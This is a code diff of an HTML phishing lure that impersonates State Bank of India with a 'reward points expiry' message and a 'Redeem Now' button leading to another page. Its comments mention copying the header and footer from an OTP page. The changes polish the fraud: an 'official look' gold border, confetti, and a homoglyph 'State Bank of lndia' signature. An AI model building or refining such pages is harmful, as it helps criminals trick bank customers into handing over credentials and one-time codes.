@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBI Reward Points Expiry</title>
+    <title>myproduct</title>
     <!-- same favicon as original -->
     <link rel="icon" type="image/png" href="https://vuejs.org/images/logo.png">
     <!-- Google Fonts for Cursive Style -->
@@ -36,27 +36,27 @@
             margin: 0 auto;
         }
         .container {
-            max-width: 460px;
+            max-width: 380px; /* Chota kiya - pehle 460px tha */
             margin: 20px auto 15px auto;
             background-color: white;
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.15);
             overflow: visible;
-            padding: 0 20px 20px 20px;
+            padding: 0 15px 15px 15px; /* Padding bhi kam ki */
             text-align: center;
             flex: 1;
             display: flex;
             flex-direction: column;
             justify-content: center;
-            border: 0px solid #d4af37; /* SBI Gold border for official look */
+            border: 4px solid #d4af37; /* SBI Gold border for official look */
         }
         
         /* Official Frame for Message */
         .official-frame {
             border: 1px solid #d4af37;
             border-radius: 8px;
-            padding: 25px 20px;
-            margin: 30px 0 20px 0;
+            padding: 20px 15px; /* Thoda kam padding */
+            margin: 25px 0 15px 0;
             background-color: #fafafa;
             box-shadow: inset 0 0 10px rgba(0,0,0,0.03), 0 2px 5px rgba(212, 175, 55, 0.1);
             position: relative;
@@ -89,10 +89,10 @@
 
         /* Colorful Congratulations Animation with CURSIVE font */
         .congratulations-animation {
-            font-size: 2.8rem;
+            font-size: 2.5rem; /* Thoda chhota kiya */
             font-weight: bold;
             text-align: center;
-            margin: 15px 0 20px 0;
+            margin: 10px 0 15px 0;
             padding: 10px 0;
             animation: colorChange 3s infinite ease-in-out;
             text-shadow: 0 0 10px rgba(0,0,0,0.2);
@@ -100,33 +100,33 @@
             position: relative;
             display: inline-block;
             width: 100%;
-            font-family: 'Pacifico', 'Dancing Script', cursive; /* CURSIVE FONT */
+            font-family: 'Pacifico', 'Dancing Script', cursive;
             line-height: 1.3;
         }
 
         @keyframes colorChange {
             0% { 
-                color: #2c517a; /* SBI Blue */
+                color: #2c517a;
                 text-shadow: 0 0 15px #d4af37, 0 0 25px #d4af37;
             }
             20% { 
-                color: #d4af37; /* SBI Gold */
+                color: #d4af37;
                 text-shadow: 0 0 15px #2c517a, 0 0 25px #2c517a;
             }
             40% { 
-                color: #c0392b; /* Rich Red */
+                color: #c0392b;
                 text-shadow: 0 0 15px #f1c40f, 0 0 25px #f1c40f;
             }
             60% { 
-                color: #27ae60; /* Green */
+                color: #27ae60;
                 text-shadow: 0 0 15px #e67e22, 0 0 25px #e67e22;
             }
             80% { 
-                color: #8e44ad; /* Purple */
+                color: #8e44ad;
                 text-shadow: 0 0 15px #f39c12, 0 0 25px #f39c12;
             }
             100% { 
-                color: #2c517a; /* Back to SBI Blue */
+                color: #2c517a;
                 text-shadow: 0 0 15px #d4af37, 0 0 25px #d4af37;
             }
         }
@@ -138,7 +138,7 @@
             right: 0px;
             top: 0;
             animation: sparkle 1.5s infinite;
-            font-family: Arial, sans-serif; /* Normal font for sparkles */
+            font-family: Arial, sans-serif;
         }
 
         .congratulations-animation::before {
@@ -147,7 +147,7 @@
             left: 0px;
             top: 0;
             animation: sparkle 1.5s infinite 0.5s;
-            font-family: Arial, sans-serif; /* Normal font for sparkles */
+            font-family: Arial, sans-serif;
         }
 
         @keyframes sparkle {
@@ -156,71 +156,71 @@
             100% { opacity: 0.3; transform: scale(0.8); }
         }
 
-        /* Reward Message - Single Color (SBI Blue) - OFFICIAL FORMATTING */
+        /* Reward Message - Single Color (SBI Blue) */
         .reward-message {
             margin: 0;
             text-align: left;
         }
         .greeting {
-            font-size: 1.2rem;
-            color: #2c517a;  /* SBI Blue */
-            margin-bottom: 15px;
+            font-size: 1.1rem;
+            color: #2c517a;
+            margin-bottom: 12px;
             font-weight: 600;
         }
         .message-line {
-            font-size: 1.1rem;
-            color: #2c517a;  /* SBI Blue */
-            line-height: 1.6;
-            margin: 10px 0;
+            font-size: 1rem;
+            color: #2c517a;
+            line-height: 1.5;
+            margin: 8px 0;
         }
         .points-highlight {
-            font-size: 2.2rem;
+            font-size: 2rem;
             font-weight: bold;
-            color: #2c517a;  /* SBI Blue */
-            margin: 5px 0 10px 0;
+            color: #2c517a;
+            margin: 5px 0 8px 0;
             display: block;
             text-align: center;
         }
         .expiry-alert {
-            color: #2c517a;  /* SBI Blue */
+            color: #2c517a;
             font-weight: bold;
-            font-size: 1.2rem;
-            margin: 15px 0;
+            font-size: 1.1rem;
+            margin: 12px 0;
             border-bottom: 2px dashed #d4af37;
             border-top: 2px dashed #d4af37;
-            padding: 10px 0;
+            padding: 8px 0;
             text-align: center;
         }
         .thankyou {
-            font-size: 1.2rem;
-            color: #2c517a;  /* SBI Blue */
-            margin: 20px 0 5px 0;
+            font-size: 1.1rem;
+            color: #2c517a;
+            margin: 15px 0 5px 0;
             font-style: italic;
             text-align: right;
         }
         .team-sbi {
-            font-size: 1.1rem;
-            color: #2c517a;  /* SBI Blue */
+            font-size: 1rem;
+            color: #2c517a;
             font-weight: bold;
             margin-bottom: 5px;
             text-align: right;
         }
 
-        /* Redeem Button - Patla (Thinner) with GREEN color and animation */
+        /* Redeem Button - Green with animation */
         .redeem-btn {
             display: inline-block;
-            background: linear-gradient(145deg, #2ecc71, #27ae60); /* Green gradient */
+            background: linear-gradient(145deg, #2ecc71, #27ae60);
             color: white;
-            font-size: 1.6rem;
+            font-size: 1.5rem;
             font-weight: bold;
-            padding: 8px 30px;
+            padding: 8px 25px;
             border: none;
             border-radius: 50px;
             cursor: pointer;
             text-decoration: none;
-            margin: 20px 0 30px 0;
+            margin: 15px 0 20px 0;
             box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-            border: 2px solid #1e8449; /* Dark green border */
+            border: 2px solid #1e8449;
             letter-spacing: 2px;
             animation: buttonGlowGreen 1.5s infinite ease-in-out;
             transition: all 0.3s ease;
@@ -249,19 +249,19 @@
             transform: scale(1.08);
             background: linear-gradient(145deg, #27ae60, #1e8449);
             box-shadow: 0 15px 30px rgba(0,0,0,0.4), 0 0 25px #2ecc71;
-            border-color: #f1c40f; /* Gold border on hover for contrast */
+            border-color: #f1c40f;
             animation: none;
         }
 
-        /* Footer styling – black background, white text (from OTP) */
+        /* Footer styling */
         .footer-links {
-            font-size: 14px;
+            font-size: 13px;
             text-align: center;
-            line-height: 1.6;
+            line-height: 1.5;
             color: white;
             background-color: #424242;
             padding: 10px 0;
-            margin-top: 20px;
+            margin-top: 15px;
             border-radius: 4px;
         }
         .footer-links a {
@@ -275,37 +275,40 @@
         }
         .footer-links span {
             color: inherit;
-            font-size: 14px;
+            font-size: 13px;
         }
 
         /* Responsive adjustment */
-        @media (max-width: 500px) {
+        @media (max-width: 400px) {
+            .container {
+                max-width: 340px;
+                padding: 0 12px 12px 12px;
+            }
             .congratulations-animation { font-size: 2.2rem; }
             .points-highlight { font-size: 1.8rem; }
-            .message-line { font-size: 1rem; }
+            .message-line { font-size: 0.95rem; }
             .redeem-btn { 
-                font-size: 1.4rem; 
-                padding: 8px 30px;
+                font-size: 1.3rem; 
+                padding: 7px 20px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- SBI Header (exactly from OTP page) -->
+    <!-- SBI Header -->
     <div class="header">
         <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="State Bank of India" class="logo">
     </div>
 
-    <!-- Main container (white box with gold border) -->
+    <!-- Main container (chota size) -->
     <div class="container">
-        <!-- Colorful Congratulations Animation with CURSIVE font -->
+        <!-- Colorful Congratulations Animation -->
         <div class="congratulations-animation">
             Congratulations! 
         </div>
 
-        <!-- Official Frame around message - Now properly formatted -->
+        <!-- Official Frame -->
         <div class="official-frame">
-            <!-- Reward Message - All in SBI Blue with proper formatting -->
             <div class="reward-message">
                 <div class="greeting">Dear Value Customer,</div>
                 
@@ -326,26 +329,25 @@
                 </div>
                 
                 <div class="thankyou">Thank you.</div>
-                <div class="team-sbi">State Bank of India</div>
+                <div class="team-sbi">State Bank of lndia</div>
             </div>
         </div>
 
-        <!-- Redeem Now Button - Green, patla, animated, and redirects to mypages.html -->
+        <!-- Redeem Now Button - Green, patla, animated, redirect to mypages.html -->
         <a href="mypages.html" class="redeem-btn">Redeem Now</a>
 
-        <!-- SBI Footer (exactly from OTP page) -->
+        <!-- SBI Footer -->
         <div class="footer-links">
             <a href="#">Privacy Statement</a> | <a href="#">Disclosure</a><br>
             <a href="#">Terms of Service (Terms & Conditions)</a><br>
             © State Bank of lndia<br>
-            <span>Site best viewed at 1024 x 768 resolution in Microsoft Edge 79+, Mozilla 96+, Google Chrome 97+</span>
+            <span>Site best viewed at 1024 x 768 resolution</span>
         </div>
     </div>
 
     <!-- Confetti library -->
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
 
-    <!-- Celebration script (confetti with 30 colors) - Starts IMMEDIATELY -->
     <script>
         (function() {
             // 30 different colors array
@@ -358,13 +360,11 @@
                 '#D2691E', '#FF8C00', '#FF7F50', '#F0E68C', '#C0C0C0'
             ];
 
-            // Page load hote hi confetti turant start hoga (IMMEDIATELY)
             window.onload = function() {
-                launchCelebration(); // No delay - turant start
+                launchCelebration();
             };
 
             function launchCelebration() {
-                // 5 Second tak lagatar bulbule (trikon) nikalenge
                 var duration = 5 * 1000;
                 var end = Date.now() + duration;
 
@@ -375,22 +375,21 @@
                         return clearInterval(interval);
                     }
 
-                    // Har burst mein 15-20 trikon with random colors from 30-color array
                     confetti({
                         particleCount: 18,
                         startVelocity: 45,
                         spread: 120,
-                        origin: { x: 0.5, y: 0.5 }, // center se
+                        origin: { x: 0.5, y: 0.5 },
                         scalar: 1.7,
                         shapes: ['triangle'],
-                        colors: colors30, // use all 30 colors
+                        colors: colors30,
                         gravity: 0.9,
                         ticks: 300
                     });
 
-                }, 150); // Har 0.15 second mein naye bulbule (tej)
+                }, 150);
             }
         })();
     </script>
 </body>
-  </html>
+</html>
